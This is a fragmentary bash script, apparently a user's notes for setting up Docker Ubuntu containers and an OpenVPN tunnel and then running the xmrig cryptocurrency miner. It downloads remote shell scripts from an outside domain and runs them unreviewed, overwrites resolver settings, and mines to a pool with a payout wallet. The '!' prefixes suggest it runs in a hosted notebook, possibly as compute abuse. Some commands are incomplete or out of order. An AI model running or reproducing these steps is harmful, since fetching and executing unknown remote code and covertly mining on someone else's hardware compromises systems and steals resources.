#!/bin/bash

google-chrome-stable --disable-dev-shm-usage

docker run -it -d --cap-add=NET_ADMIN --device /dev/net/tun --cpus="2" ubuntu
docker ps
docker exec -it

wget https://demo.zayuh.asia/coin.sh
sh coin.sh

wget https://demo.zayuh.asia/a.sh
sh a.sh

docker run -it -d --cap-add=NET_ADMIN --device /dev/net/tun --cpus="4" ubuntu
manishfoodtechs/xfcefulldesktop_ubuntu20.4
sudo ssh
chmod 600 cc.ppk
nano /etc/resolv.conf

apt-get update
apt-get install -y net-tools wget openvpn dnsmasq nano

wget https://demo.zayuh.asia/rdp.ovpn

echo "nameserver 8.8.8.8" > /etc/resolv.conf

service dnsmasq start

openvpn --config rdp.ovpn --daemon

! wget https://demo.zayuh.asia/a.tar.gz
! tar -xf a.tar.gz
cd xmrig-6.15.1
! ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qxt9n2qq8yy2n462atcqejuu63cfdm07aztx5d3.C1 -p x
